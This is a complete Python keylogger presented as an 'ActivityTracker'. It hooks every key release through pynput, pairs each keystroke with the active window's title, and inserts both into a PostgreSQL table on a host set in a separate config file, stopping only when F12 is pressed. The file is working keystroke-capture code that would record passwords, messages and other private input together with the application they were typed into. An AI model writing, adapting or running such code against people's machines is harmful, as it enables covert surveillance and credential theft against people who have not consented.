from pynput import keyboard
from time import gmtime, strftime
import pygetwindow as gw
import psycopg2 
from DB_DATA import DBNAME, USERNAME, PASSWORD, HOST, PORT

class ActivityTracker:
    def __init__(self):
        self.conn= self._connect_to_database()

    def on_release(self, key):
        cursor= self.conn.cursor()
        insert_query= """
        INSERT INTO input_log(context, key_value) 
        VALUES(%s, %s);
        """

        try:
            print(key.char)
            data= (
                gw.getActiveWindowTitle(),
                key.char
            )
        except AttributeError:
            print(key)
            data= (
                gw.getActiveWindowTitle(),
                str(key),
            )

        cursor.execute(insert_query, data)
        self.conn.commit()
        cursor.close()

        if str(key) == "Key.f12":
            return False


    def _connect_to_database(self):
        try:
            conn= psycopg2.connect(
                dbname= DBNAME,
                user= USERNAME,
                password= PASSWORD,
                host= HOST,
                port= PORT
            )

            return conn
        except Exception as e:
            print(f"Could not connect to the database: {e}")


tracker= ActivityTracker()
with keyboard.Listener(
    on_release= tracker.on_release
) as listener:
    listener.join()